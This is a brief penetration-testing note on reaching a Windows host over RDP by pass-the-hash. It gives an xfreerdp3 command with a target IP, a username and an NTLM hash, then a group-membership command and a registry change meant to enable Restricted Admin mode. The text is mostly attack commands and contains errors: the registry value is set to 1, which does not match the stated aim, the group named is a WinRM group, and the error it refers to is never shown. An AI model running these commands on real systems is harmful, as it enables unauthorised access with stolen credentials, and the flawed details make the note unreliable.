
If we want to access the target system with hash by RDP 

```ruby
xfreerdp3 /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

### Adding the DisableRestrictedAdmin Registry Key

If it says :
`Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error . We should enable it :

```ruby
net localgroup "Remote Management Users" <user> /add
```

```ruby
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x1 /f
```


